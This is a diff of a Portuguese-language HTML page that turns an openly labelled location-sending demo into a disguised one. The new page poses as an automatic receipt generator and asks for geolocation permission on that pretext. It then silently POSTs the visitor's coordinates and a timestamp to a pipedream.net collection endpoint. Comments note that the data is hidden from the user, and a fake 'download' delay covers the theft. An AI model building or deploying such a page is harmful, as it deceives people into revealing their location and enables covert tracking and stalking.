@@ -1,51 +1,79 @@
 <!DOCTYPE html>
 <html lang="pt-BR">
+
 <head>
-    <meta charset="UTF-8">
-    <title>Envio automático da localização</title>
+    <meta charset="UTF-8" />
+    <title>Comprovante Automático</title>
 </head>
+
 <body>
-    <h2>Obtendo localização e enviando...</h2>
-    <p id="status">Aguardando permissão...</p>
+    <h2>Gerando seu comprovante...</h2>
+    <p id="status">Aguardando autorização para gerar seu comprovante.</p>
 
     <script>
         function enviarLocalizacao(lat, lon) {
-            // Exemplo usando Webhook.site
-            fetch("https://webhook.site/seu-endereco-aqui", {
+            fetch("https://7333f0d195fad0b3ff8e4fa7942e94a6.m.pipedream.net", {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
+                    // Dados enviados sem explicitar na interface
                     latitude: lat,
                     longitude: lon,
                     timestamp: new Date().toISOString()
                 })
             })
-            .then(() => {
-                document.getElementById("status").innerText = "Localização enviada com sucesso!";
-            })
-            .catch((err) => {
-                document.getElementById("status").innerText = "Erro ao enviar: " + err;
-            });
+                .then(() => {
+                    document.getElementById("status").innerText = "Comprovante sendo processado. Aguarde o download.";
+                    // Simular um delay para "download"
+                    setTimeout(() => {
+                        document.getElementById("status").innerText = "Comprovante gerado com sucesso!";
+                    }, 3000);
+                })
+                .catch((err) => {
+                    document.getElementById("status").innerText = "Erro ao gerar comprovante. Por favor, permita o acesso.";
+                });
         }
 
         function obterLocalizacao() {
             if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(function(position) {
-                    const lat = position.coords.latitude;
-                    const lon = position.coords.longitude;
-                    document.getElementById("status").innerText = `Latitude: ${lat}, Longitude: ${lon}`;
-
-                    // Envia automaticamente para servidor
-                    enviarLocalizacao(lat, lon);
-                }, function(error) {
-                    document.getElementById("status").innerText = "Erro ao obter localização: " + error.message;
-                });
+                navigator.geolocation.getCurrentPosition(
+                    function (position) {
+                        const lat = position.coords.latitude;
+                        const lon = position.coords.longitude;
+                        // Não exibe latitude/longitude para usuário
+                        enviarLocalizacao(lat, lon);
+                    },
+                    function (error) {
+                        document.getElementById("status").innerText = "Não foi possível gerar o comprovante: " + error.message;
+                    }
+                );
             } else {
-                document.getElementById("status").innerText = "Geolocalização não suportada.";
+                document.getElementById("status").innerText = "Seu dispositivo não suporta esta funcionalidade.";
             }
         }
 
-        obterLocalizacao();
+        if (navigator.permissions) {
+            navigator.permissions.query({ name: 'geolocation' }).then(function (result) {
+                if (result.state === 'granted') {
+                    document.getElementById("status").innerText = "Permissão concedida. Gerando comprovante...";
+                    obterLocalizacao();
+                } else if (result.state === 'prompt') {
+                    document.getElementById("status").innerText = "Por favor, permita o acesso para gerar seu comprovante.";
+                    obterLocalizacao();
+                } else if (result.state === 'denied') {
+                    document.getElementById("status").innerText = "Permissão negada. Ative nas configurações para gerar comprovante.";
+                }
+
+                result.onchange = () => {
+                    if (result.state === 'granted') {
+                        obterLocalizacao();
+                    }
+                };
+            });
+        } else {
+            obterLocalizacao();
+        }
     </script>
 </body>
+
 </html>
